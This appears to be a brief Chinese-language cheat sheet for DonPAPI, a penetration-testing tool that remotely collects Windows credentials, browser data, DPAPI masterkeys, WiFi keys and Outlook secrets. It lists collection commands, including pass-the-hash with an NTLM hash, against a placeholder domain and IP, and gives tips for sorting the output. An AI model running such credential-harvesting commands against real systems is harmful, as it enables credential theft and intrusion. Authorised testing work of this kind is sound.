# DonPAPI 常用用法

DonPAPI 适合 Windows 凭据、浏览器、DPAPI、WiFi 和 Outlook 等信息收集。常用参数：目标、用户名、密码、域。

```bash
donpapi collect -d example.local -u USER -p 'PASSWORD' -t 192.168.1.10
```

```bash
donpapi collect -d example.local -u USER -p 'PASSWORD' -t 192.168.1.10 -o out
```

```bash
donpapi collect -d example.local -u USER -H NTLM_HASH -t 192.168.1.10
```

```bash
donpapi --help
```

小记录：DonPAPI 偏主机凭据收集，输出很长。拿到结果后先按浏览器、WiFi、DPAPI masterkey 和 Outlook 分目录看。
